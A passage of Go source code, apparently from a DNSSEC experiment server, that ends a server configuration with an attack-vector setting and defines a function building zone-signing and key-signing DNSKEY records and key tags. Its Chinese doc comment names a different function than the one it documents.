				},
				DNSSECMap: dMap,
				AttackVec: ExperiVec,
			},
			AttackVector: ExperiVec,
		},
	)

	server.Start()
}

// InitTrustAnchor 根据 DNSSEC 配置生成指定区域的信任锚点
// 其接受参数为：
//   - zName string，区域名
//   - dConf DNSSECConfig，DNSSEC 配置
//   - kBytes []byte，KSK 公钥
//   - pkBytes []byte，KSK 私钥
//
// 返回值为：
//   - map[string]DNSSECMaterial，生成的信任锚点
func InitMaterial(name string, algo dns.DNSSECAlgorithm, kskPublic, kskPriv []byte) DNSSECMaterial {

	zskRR, zskPriv := xperi.GenerateRRDNSKEY(name, algo, dns.DNSKEYFlagZoneKey)
	zskRDATA := zskRR.RData.(*dns.DNSRDATADNSKEY)

	kskRDATA := dns.DNSRDATADNSKEY{
		Flags:     dns.DNSKEYFlagSecureEntryPoint,
		Protocol:  dns.DNSKEYProtocolValue,
		Algorithm: algo,
		PublicKey: kskPublic,
	}

	kskRR := dns.DNSResourceRecord{
		Name:  name,
		Type:  dns.DNSRRTypeDNSKEY,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(kskRDATA.Size()),
		RData: &kskRDATA,
	}

	zskTag := xperi.CalculateKeyTag(*zskRDATA)
	kskTag := xperi.CalculateKeyTag(kskRDATA)

	return DNSSECMaterial{
		ZSKTag: int(zskTag),
		KSKTag: int(kskTag),

		ZSKRecord: zskRR,
		KSKRecord: kskRR,

		ZSKPriv: zskPriv,
		KSKPriv: kskPriv,
	}
}
